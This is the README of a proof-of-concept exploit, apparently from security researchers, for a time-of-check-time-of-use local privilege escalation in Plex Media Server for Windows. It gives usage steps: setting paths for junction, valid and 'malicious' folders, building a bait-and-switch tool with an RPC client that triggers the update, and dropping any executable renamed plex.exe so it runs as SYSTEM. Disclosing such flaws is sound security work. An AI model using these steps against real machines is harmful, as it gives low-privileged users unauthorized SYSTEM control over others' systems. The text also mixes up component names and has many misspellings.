# Local Privilege PlEXcalasion 

PlEXcalasion is a local privilige escalasion in Plex media server for windows.
Discoverd by Tomer Peled, Netanel Cohen and Amir Shen a security researchers at BugSec Israel.

The exploit levrage A Time Of Check Time Of Use (TOCTOU) vulnerabilry, allow a low privilige user gain SYSTEM priviliges.

 

This POC use tools developed by James Forshaw with slight modifications, The original can be found [here][https://github.com/googleprojectzero/symboliclink-testing-tools]

In addition to the above tools , we have created an RPC client that will trigger the update.




## Usage

1. Clone the repository and open PlEXcalasion.sln in Visual Studio.


2. Modify Paths:

PlexClient/PlexClient.cpp replace ROOTDIR with your path.
```cpp
const wchar_t* pszString = L"<ROOTDIR>\\PlEXcalaison\\TOCTOU\\junction\\plex.exe"; // Path to the update file. 
```
PlEXcalaison/BaitAndSwitch/BaitAndSwitch.cpp replace ROOTDIR with your path.
```cpp
static LPCWSTR junction = L"<ROOTDIR>\\PlEXcalaison\\TOCTOU\\junction";  // Path to junction folder , MAKE SURE IT IS EMPTY !
static LPCWSTR target1 = L"<ROOTDIR>\\PlEXcalaison\\TOCTOU\\valid"; // Path to folder contains the valid update file.
static LPCWSTR target2 = L"<ROOTDIR>\\PlEXcalaison\\TOCTOU\\malicious"; // Path to folder contains the malicious file - MUST BE THE SAME NAME AS THE UPDATE FILE.
static LPCWSTR cacert = L"C:\\Program Files (x86)\\Plex\\Plex Media Server\\Resources\\cacert.pem"; // Path to cacert.pem - can be found in plex directory.
```

3. Build the solution.
4. Make sure a PlexClient.exe file was created in the Release dir.
5. Put the desired executeable file u want to execute as system in the malicious folder and name it plex.exe (for the poc i used cmd.exe)

6. Execute BiteAndSwap.exe



